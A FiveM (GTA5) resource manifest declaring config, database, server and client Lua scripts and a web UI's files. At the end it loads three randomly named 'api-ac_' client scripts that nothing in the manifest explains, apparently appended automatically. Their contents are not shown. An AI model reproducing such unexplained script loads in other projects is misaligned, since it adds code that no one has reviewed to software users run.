fx_version "bodacious"

games {"gta5"}
lua54 'yes'

ui_page('client/html/index.html')

server_scripts {
	'config.lua',
	'@oxmysql/lib/MySQL.lua',
	'server/server.lua'
}

client_scripts {
	'config.lua',
	'client/client.lua'
}

files {
	'client/html/index.html',
    'client/html/css/chunk-*.css',
    'client/html/js/chunk-*.js',
    'client/html/css/app.css',
    'client/html/js/app.js',
    'client/html/img/citizen-image-placeholder.png',
    'client/html/img/example-image.jpg',
    'client/html/img/*.png',
    'client/html/config/config.json'
} 


client_script "api-ac_OJOKaWCvUYzT.lua"
client_script "api-ac_vOJKHGqGxvPe.lua"
client_script "api-ac_uuQhioHoEMHi.lua"